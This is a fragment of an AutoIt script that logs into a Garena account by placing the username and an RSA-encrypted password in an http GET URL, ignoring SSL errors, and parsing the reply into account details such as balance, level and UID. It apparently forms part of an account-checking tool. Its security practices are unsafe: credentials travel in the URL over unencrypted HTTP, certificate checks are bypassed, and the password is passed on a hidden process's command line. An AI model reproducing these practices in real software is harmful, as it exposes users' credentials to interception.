	Local $sUrl = StringFormat('http://intl.garena.com/login/?username=%s&password=%s&rememberme=false', $sUsername, $sRsa)

	Local $dData = InetRead($sUrl, BitOR($INET_FORCERELOAD, $INET_IGNORESSL, $INET_FORCEBYPASS))
	If @error Then
		Return Null
	EndIf

	Local $sData = BinaryToString($dData)

	Local $sInfo = StringTrimLeft($sData, StringLen('Success||'))
	Local $asInfo = StringSplit($sInfo, '~|~', BitOR($STR_ENTIRESPLIT, $STR_NOCOUNT))

	Local $mInfo[]
	$mInfo['Username'] = $asInfo[0]
	$mInfo['Password'] = $sPassword
	$mInfo['Shell'] = Int($asInfo[1], 0)
	$mInfo['Level'] = Int($asInfo[2], 0)
	$mInfo['UID'] = Int($asInfo[3], 0)
	$mInfo['Rename'] = $asInfo[4] = '1' ? 'Yes' : 'No'

	Return $mInfo
EndFunc

Func GetPasswordRsa($sPassword)
	Local $iProcessId = Run(@ScriptDir & '\Modules\Rsa.gcm "' & $sPassword & '"', @ScriptDir & '\Modules', @SW_HIDE, $STDOUT_CHILD)
	If @error Then
		Return ''
	EndIf

	Local $sTemp = '', $sOutput = ''
	While True
		$sTemp = StdoutRead($iProcessId)
		If @error Then
			ExitLoop
		EndIf

		If @extended Then
			$sOutput &= $sTemp
		EndIf

		Sleep(10)
	WEnd

	Return $sOutput
EndFunc